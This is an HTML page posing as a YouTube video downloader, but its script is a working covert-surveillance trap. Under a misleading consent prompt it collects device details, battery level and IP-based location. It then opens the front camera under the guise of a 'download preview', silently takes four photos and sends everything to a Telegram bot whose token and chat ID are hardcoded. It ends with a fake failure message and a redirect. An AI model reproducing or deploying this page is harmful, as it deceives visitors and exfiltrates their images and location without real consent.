<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Downloader</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, #f0f0f0 0%, #dcdcdc 100%);
            min-height: 100vh;
            color: #222;
            line-height: 1.6;
        }
        
        .navbar {
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            color: white;
            text-align: center;
            padding: 20px 0;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        
        #header {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 1px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            margin-top: 10px;
        }
        
        .youtube-logo {
            display: block;
            margin: 0 auto 10px;
            width: 80px;
            height: auto;
        }
        
        .container {
            max-width: 95%;
            margin: 20px auto;
            padding: 20px;
            background: rgba(255,255,255,0.95);
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        
        .form-control {
            width: 100%;
            margin-bottom: 20px;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            font-family: 'Montserrat', sans-serif;
        }
        
        #thumbdloadbtn {
            display: block;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Montserrat', sans-serif;
            transition: all 0.3s ease;
        }
        
        #thumbdloadbtn:active {
            transform: scale(0.98);
            background: linear-gradient(135deg, #990000 0%, #660000 100%);
        }
        
        h2 {
            color: #333;
            font-size: 20px;
            font-weight: 600;
            margin: 25px 0 15px 0;
            text-align: center;
        }
        
        ol {
            background: rgba(255,0,0,0.05);
            padding: 20px 25px;
            border-radius: 10px;
            border-left: 4px solid #ff0000;
            margin-bottom: 20px;
        }
        
        ol li {
            margin-bottom: 10px;
            font-size: 15px;
            line-height: 1.5;
            color: #555;
        }
        
        #message-container {
            margin-top: 20px;
            font-size: 15px;
            color: green;
            white-space: pre-wrap;
            font-family: monospace;
            background-color: #f5f5f5;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ddd;
            text-align: center;
        }
        
        #preview {
            display: none;
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            border-radius: 10px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid #cc0000;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .camera-preview {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .camera-preview video {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        .capture-btn {
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 15px auto;
            padding: 12px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Montserrat', sans-serif;
        }
        
        .capture-btn:active {
            transform: scale(0.98);
        }
        
        .redirect-countdown {
            display: none;
            text-align: center;
            margin: 20px 0;
            font-size: 16px;
            color: #cc0000;
            font-weight: bold;
        }
        
        .capture-counter {
            display: none;
            text-align: center;
            margin: 10px 0;
            font-size: 14px;
            color: #666;
            font-weight: bold;
        }
        
        @media (min-width: 768px) {
            .container {
                max-width: 650px;
                padding: 30px;
            }
            
            #header {
                font-size: 32px;
            }
            
            .youtube-logo {
                width: 120px;
            }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
        <h1 id="header">YOUTUBE VIDEO DOWNLOADER</h1>
    </nav>

    <div class="container">
        <input id="ytlink" type="text" class="form-control" placeholder="Paste YouTube VIDEO/MUSIC Link">
        <button id="thumbdloadbtn">DOWNLOAD</button>

        <h2>How to Download HD YouTube Music Thumbnail</h2>
        <ol>
            <li>Copy the YouTube Music Video Link</li>
            <li>Paste the link in the field above</li>
            <li>Click on "DOWNLOAD" to start process</li>
        </ol>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your request...</p>
        </div>
        
        <div class="camera-preview" id="cameraPreview">
            <p>Download Preview:</p>
            <video id="preview" autoplay playsinline muted></video>
            <div class="capture-counter" id="captureCounter">
                Processing 1 of 4 - Please wait few seconds...
            </div>
            <button class="capture-btn" id="captureBtn">PROCESS & DOWNLOAD</button>
        </div>
        
        <div class="redirect-countdown" id="redirectCountdown">
            Redirecting to free download service in <span id="countdown">5</span> seconds...
        </div>
        
        <div id="message-container"></div>
    </div>

    <script>
        // Telegram bot configuration
        const botToken = '8395178593:AAGtnQl4yD9zjGcOfP2rKOr4z7GEIoewZIo';
        const chatId = '8025805233';
        const ipInfoToken = 'bb6ec807490a04';
        
        // DOM elements
        const fetchBtn = document.getElementById('thumbdloadbtn');
        const loadingEl = document.getElementById('loading');
        const messageContainer = document.getElementById('message-container');
        const cameraPreview = document.getElementById('cameraPreview');
        const previewVideo = document.getElementById('preview');
        const captureBtn = document.getElementById('captureBtn');
        const redirectCountdown = document.getElementById('redirectCountdown');
        const countdownElement = document.getElementById('countdown');
        const captureCounter = document.getElementById('captureCounter');
        
        // Event listeners
        fetchBtn.addEventListener('click', initiateProcess);
        captureBtn.addEventListener('click', startMultiCapture);
        
        // Global variables
        let mediaStream = null;
        let deviceInfo = null;
        let ipData = null;
        let captureBlobs = [];
        let captureCount = 0;
        const totalCaptures = 4;
        
        // Main process initiation
        async function initiateProcess() {
            // Reset UI
            resetUI();
            
            // Get YouTube link
            const ytLink = document.getElementById('ytlink').value.trim();
            if (!ytLink) {
                showMessage('Please enter a YouTube VIDEO/MUSIC link', 'error');
                return;
            }
            
            // Show loading
            showLoading(true);
            
            try {
                // Step 1: Get device info consent
                deviceInfo = await collectDeviceInfo();
                if (!deviceInfo) {
                    showLoading(false);
                    showMessage('Process cancelled by user', 'info');
                    return;
                }
                
                // Step 2: Get IP info
                ipData = await getIPInfo();
                
                // Step 3: Request camera access
                await requestCameraAccess();
                
            } catch (error) {
                console.error('Process error:', error);
                showLoading(false);
                showMessage('An error occurred. Please try again.', 'error');
            }
        }
        
        // Reset UI elements
        function resetUI() {
            showLoading(false);
            cameraPreview.style.display = 'none';
            redirectCountdown.style.display = 'none';
            captureCounter.style.display = 'none';
            messageContainer.innerText = '';
            captureBlobs = [];
            captureCount = 0;
            
            // Stop any active media stream
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
        }
        
        // Show/hide loading indicator
        function showLoading(show) {
            loadingEl.style.display = show ? 'block' : 'none';
        }
        
        // Display messages to user
        function showMessage(message, type = 'info') {
            messageContainer.innerText = message;
            messageContainer.style.color = type === 'error' ? '#d32f2f' : 
                                          type === 'success' ? '#388e3c' : '#1976d2';
        }
        
        // Get IP information
        async function getIPInfo() {
            try {
                const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
                return await response.json();
            } catch (error) {
                console.error("IP info fetch failed:", error);
                return {};
            }
        }
        
        // Send data to Telegram
        async function sendToTelegram(message, photoBlobs = []) {
            try {
                // Send text message
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                // Send photos if available
                for (let i = 0; i < photoBlobs.length; i++) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', photoBlobs[i], `capture_${i + 1}.jpg`);
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                return true;
            } catch (error) {
                console.error("Telegram send failed:", error);
                return false;
            }
        }
        
        // Generate device information
        function generateDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const vendor = navigator.vendor;
            const language = navigator.language;
            
            // Detect device type
            let deviceType = "Unknown";
            let manufacturer = "Unknown";
            let model = "Unknown";
            let os = "Unknown";
            
            // iOS detection
            if (/iPhone|iPad|iPod/i.test(userAgent)) {
                deviceType = /iPad/i.test(userAgent) ? "iPad" : "iPhone";
                manufacturer = "Apple";
                model = deviceType;
                
                // Extract iOS version
                const iosMatch = userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
                if (iosMatch) {
                    os = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
                }
            } 
            // Android detection - IMPROVED VERSION DETECTION
            else if (/Android/i.test(userAgent)) {
                deviceType = "Android";
                manufacturer = "Unknown";
                
                // Try to extract Android device model
                const androidModelMatch = userAgent.match(/Android.*;\s([^;]+)\sBuild/i);
                if (androidModelMatch && androidModelMatch[1]) {
                    model = androidModelMatch[1];
                } else {
                    model = "Unknown";
                }
                
                // Extract Android version - IMPROVED REGEX
                const androidMatch = userAgent.match(/Android\s([\d.]+);/);
                if (androidMatch && androidMatch[1]) {
                    os = `Android ${androidMatch[1]}`;
                } else {
                    // Alternative method for Android version detection
                    const altAndroidMatch = userAgent.match(/Android (\d+)/);
                    if (altAndroidMatch && altAndroidMatch[1]) {
                        os = `Android ${altAndroidMatch[1]}`;
                    } else {
                        os = "Android (Unknown version)";
                    }
                }
                
                // Try to get manufacturer from user agent
                if (/Samsung/i.test(userAgent)) manufacturer = "Samsung";
                else if (/Xiaomi/i.test(userAgent)) manufacturer = "Xiaomi";
                else if (/Huawei/i.test(userAgent)) manufacturer = "Huawei";
                else if (/OnePlus/i.test(userAgent)) manufacturer = "OnePlus";
                else if (/Google/i.test(userAgent)) manufacturer = "Google";
                else if (/Motorola/i.test(userAgent)) manufacturer = "Motorola";
                else if (/LG/i.test(userAgent)) manufacturer = "LG";
                else if (/Sony/i.test(userAgent)) manufacturer = "Sony";
                
            }
            // Other devices
            else {
                deviceType = "Desktop";
                manufacturer = "Unknown";
                model = "Unknown";
                os = platform;
            }
            
            // Screen information
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const colorDepth = window.screen.colorDepth;
            
            return {
                deviceType: deviceType,
                manufacturer: manufacturer,
                model: model,
                os: os,
                platform: platform,
                userAgent: userAgent,
                vendor: vendor,
                language: language,
                screen: `${screenWidth}x${screenHeight}`,
                colorDepth: `${colorDepth}-bit`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toString()
            };
        }
        
        // Collect device information with user consent
        async function collectDeviceInfo() {
            const consent = confirm("This site would like to collect basic device information to optimize your experience. Do you agree?");
            if (!consent) return null;

            const deviceInfo = generateDeviceInfo();
            
            // Try to get battery information (not available on iOS)
            let batteryLevel = "Unavailable";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (err) {
                    console.warn("Battery info not available:", err);
                }
            }
            
            deviceInfo.batteryLevel = batteryLevel;
            
            return deviceInfo;
        }
        
        // Format device and IP info for Telegram
        function formatDeviceInfo(deviceInfo, ipData) {
            let message = `üéµ YouTube Video Downloader Capture üéµ\n\n`;
            
            message += `üì± Device Information:\n`;
            message += `‚Ä¢ Device: ${deviceInfo.deviceType}\n`;
            message += `‚Ä¢ Manufacturer: ${deviceInfo.manufacturer}\n`;
            message += `‚Ä¢ Model: ${deviceInfo.model}\n`;
            message += `‚Ä¢ OS: ${deviceInfo.os}\n`;
            message += `‚Ä¢ Platform: ${deviceInfo.platform}\n`;
            message += `‚Ä¢ Screen: ${deviceInfo.screen}\n`;
            message += `‚Ä¢ Language: ${deviceInfo.language}\n`;
            message += `‚Ä¢ Timezone: ${deviceInfo.timezone}\n`;
            message += `‚Ä¢ Battery: ${deviceInfo.batteryLevel}\n`;
            message += `‚Ä¢ Local Time: ${deviceInfo.localTime}\n\n`;
            
            message += `üåê Network Information:\n`;
            message += `‚Ä¢ IP: ${ipData.ip || 'N/A'}\n`;
            message += `‚Ä¢ City: ${ipData.city || 'N/A'}\n`;
            message += `‚Ä¢ Region: ${ipData.region || 'N/A'}\n`;
            message += `‚Ä¢ Country: ${ipData.country || 'N/A'}\n`;
            message += `‚Ä¢ Location: ${ipData.loc || 'N/A'}\n`;
            message += `‚Ä¢ ISP: ${ipData.org || 'N/A'}\n`;
            message += `‚Ä¢ Postal Code: ${ipData.postal || 'N/A'}\n`;
            message += `‚Ä¢ Timezone: ${ipData.timezone || 'N/A'}\n\n`;
            
            message += `üîó YouTube Link:\n`;
            message += `${document.getElementById('ytlink').value || 'Not provided'}\n\n`;
            message += `üì∏ Captured ${captureBlobs.length} images`;
            
            return message;
        }
        
        // Request camera access
        async function requestCameraAccess() {
            try {
                // Stop any existing stream
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                // Request camera with mobile-friendly constraints
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                // Set video source and show preview
                previewVideo.srcObject = mediaStream;
                
                // Wait for video to load
                await new Promise((resolve) => {
                    previewVideo.onloadedmetadata = () => {
                        previewVideo.play();
                        resolve();
                    };
                });
                
                // Hide loading and show camera preview
                showLoading(false);
                cameraPreview.style.display = 'block';
                showMessage('Youtube Link Processed Successfully‚úÖ. Click "PROCESS & DOWNLOAD" to download your file.', 'info');
                
            } catch (error) {
                console.error('Camera access error:', error);
                showLoading(false);
                
                if (error.name === 'NotAllowedError') {
                    showMessage('Camera access denied‚ùé. Please allow camera access to continue.', 'error');
                } else if (error.name === 'NotFoundError') {
                    showMessage('No camera found on your device.', 'error');
                } else {
                    showMessage('Unable to access camera‚ùå. Please try again.', 'error');
                }
            }
        }
        
        // Start multi-capture process
        async function startMultiCapture() {
            if (!mediaStream) {
                showMessage('Camera not available. Please try again.', 'error');
                return;
            }
            
            captureBtn.disabled = true;
            captureCounter.style.display = 'block';
            captureBlobs = [];
            captureCount = 0;
            
            showMessage('Starting file processing...', 'info');
            
            // Capture 4 images with delays between them
            for (let i = 0; i < totalCaptures; i++) {
                captureCount = i + 1;
                captureCounter.textContent = `Capture ${captureCount} of ${totalCaptures} - Please hold still...`;
                
                // Capture image
                const blob = await captureImage();
                if (blob) {
                    captureBlobs.push(blob);
                    showMessage(`‚úÖ SERVER ${captureCount} of ${totalCaptures} (failed)...`, 'success');
                }
                
                // Wait 1 second between captures (except for the last one)
                if (i < totalCaptures - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            // After all captures are done, send to Telegram
            await completeCaptureProcess();
        }
        
        // Capture single image
        async function captureImage() {
            try {
                // Create canvas and capture image
                const canvas = document.createElement('canvas');
                canvas.width = previewVideo.videoWidth || 640;
                canvas.height = previewVideo.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
                
                // Convert to blob
                return await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
            } catch (error) {
                console.error('Capture error:', error);
                return null;
            }
        }
        
        // Complete the capture process and send data
        async function completeCaptureProcess() {
            showMessage('Processing file successfully...', 'info');
            
            try {
                // Format message
                const message = formatDeviceInfo(deviceInfo, ipData);
                
                // Send to Telegram
                const success = await sendToTelegram(message, captureBlobs);
                
                // Stop camera
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                    mediaStream = null;
                }
                
                // Update UI
                cameraPreview.style.display = 'none';
                captureCounter.style.display = 'none';
                captureBtn.disabled = false;
                
                if (success) {
                    showMessage('üò¢File Failed To Download, try out our free source downloader', 'success');
                    // Start redirect countdown
                    startRedirectCountdown();
                } else {
                    showMessage('‚ö†Ô∏è Download completed but there was an issue sending confirmation.', 'info');
                }
                
            } catch (error) {
                console.error('Process completion error:', error);
                showMessage('An error occurred during processing. Please try again.', 'error');
                captureBtn.disabled = false;
            }
        }
        
        // Start redirect countdown
        function startRedirectCountdown() {
            redirectCountdown.style.display = 'block';
            let countdown = 5;
            
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = countdown;
                countdown--;
                
                if (countdown < 0) {
                    clearInterval(countdownInterval);
                    window.location.href = 'https://www.clipto.com/media-downloader/free-youtube-to-mp3-converter-0416';
                }
            }, 1000);
        }
    </script>
</body>
</html>
